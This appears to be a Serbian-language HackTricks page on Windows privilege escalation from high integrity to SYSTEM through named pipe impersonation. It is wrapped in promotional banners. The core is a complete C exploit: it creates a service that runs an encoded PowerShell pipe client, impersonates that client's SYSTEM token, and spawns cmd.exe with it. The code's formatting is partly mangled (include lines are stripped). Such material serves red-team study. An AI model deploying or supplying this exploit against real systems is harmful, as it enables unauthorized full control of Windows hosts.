# From High Integrity to SYSTEM with Name Pipes

<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

**Tok koda:**

1. Kreirajte novu cjevovod (Pipe)
2. Kreirajte i pokrenite servis koji će se povezati na kreiranu cjevovod i nešto napisati. Kod servisa će se izvršiti ovaj enkodirani PS kod: `$pipe = new-object System.IO.Pipes.NamedPipeClientStream("piper"); $pipe.Connect(); $sw = new-object System.IO.StreamWriter($pipe); $sw.WriteLine("Go"); $sw.Dispose();`
3. Servis prima podatke od klijenta u cjevovodu, poziva ImpersonateNamedPipeClient i čeka da servis završi
4. Na kraju, koristi token dobijen od servisa da pokrene novi _cmd.exe_

{% hint style="warning" %}
Ako nemate dovoljno privilegija, eksploit može da se zaglavi i nikada se ne vrati.
{% endhint %}

\`\`\`c #include #include

\#pragma comment (lib, "advapi32") #pragma comment (lib, "kernel32")

\#define PIPESRV "PiperSrv" #define MESSAGE\_SIZE 512

int ServiceGo(void) {

SC\_HANDLE scManager; SC\_HANDLE scService;

scManager = OpenSCManager(NULL, SERVICES\_ACTIVE\_DATABASE, SC\_MANAGER\_ALL\_ACCESS);

if (scManager == NULL) { return FALSE; }

// create Piper service scService = CreateServiceA(scManager, PIPESRV, PIPESRV, SERVICE\_ALL\_ACCESS, SERVICE\_WIN32\_OWN\_PROCESS, SERVICE\_DEMAND\_START, SERVICE\_ERROR\_NORMAL, "C:\Windows\\\System32\cmd.exe /rpowershell.exe -EncodedCommand JABwAGkAcABlACAAPQAgAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABTAHkAcwB0AGUAbQAuAEkATwAuAFAAaQBwAGUAcwAuAE4AYQBtAGUAZABQAGkAcABlAEMAbABpAGUAbgB0AFMAdAByAGUAYQBtACgAIgBwAGkAcABlAHIAIgApADsAIAAkAHAAaQBwAGUALgBDAG8AbgBuAGUAYwB0ACgAKQA7ACAAJABzAHcAIAA9ACAAbgBlAHcALQBvAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ASQBPAC4AUwB0AHIAZQBhAG0AVwByAGkAdABlAHIAKAAkAHAAaQBwAGUAKQA7ACAAJABzAHcALgBXAHIAaQB0AGUATABpAG4AZQAoACIARwBvACIAKQA7ACAAJABzAHcALgBEAGkAcwBwAG8AcwBlACgAKQA7AA==", NULL, NULL, NULL, NULL, NULL);

if (scService == NULL) { //printf("\[!] CreateServiceA() failed: \[%d]\n", GetLastError()); return FALSE; }

// launch it StartService(scService, 0, NULL);

// wait a bit and then cleanup Sleep(10000); DeleteService(scService);

CloseServiceHandle(scService); CloseServiceHandle(scManager); }

int main() {

LPCSTR sPipeName = "\\\\.\pipe\piper"; HANDLE hSrvPipe; HANDLE th; BOOL bPipeConn; char pPipeBuf\[MESSAGE\_SIZE]; DWORD dBRead = 0;

HANDLE hImpToken; HANDLE hNewToken; STARTUPINFOA si; PROCESS\_INFORMATION pi;

// open pipe hSrvPipe = CreateNamedPipeA(sPipeName, PIPE\_ACCESS\_DUPLEX, PIPE\_TYPE\_MESSAGE | PIPE\_WAIT, PIPE\_UNLIMITED\_INSTANCES, 1024, 1024, 0, NULL);

// create and run service th = CreateThread(0, 0, (LPTHREAD\_START\_ROUTINE)ServiceGo, NULL, 0, 0);

// wait for the connection from the service bPipeConn = ConnectNamedPipe(hSrvPipe, NULL); if (bPipeConn) { ReadFile(hSrvPipe, \&pPipeBuf, MESSAGE\_SIZE, \&dBRead, NULL);

// impersonate the service (SYSTEM) if (ImpersonateNamedPipeClient(hSrvPipe) == 0) { return -1; }

// wait for the service to cleanup WaitForSingleObject(th, INFINITE);

// get a handle to impersonated token if (!OpenThreadToken(GetCurrentThread(), TOKEN\_ALL\_ACCESS, FALSE, \&hImpToken)) { return -2; }

// create new primary token for new process if (!DuplicateTokenEx(hImpToken, TOKEN\_ALL\_ACCESS, NULL, SecurityDelegation, TokenPrimary, \&hNewToken)) { return -4; }

//Sleep(20000); // spawn cmd.exe as full SYSTEM user ZeroMemory(\&si, sizeof(si)); si.cb = sizeof(si); ZeroMemory(\&pi, sizeof(pi)); if (!CreateProcessWithTokenW(hNewToken, LOGON\_NETCREDENTIALS\_ONLY, L"cmd.exe", NULL, NULL, NULL, NULL, (LPSTARTUPINFOW)\&si, \&pi)) { return -5; }

// revert back to original security context RevertToSelf();

}

return 0; }

```
<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
```
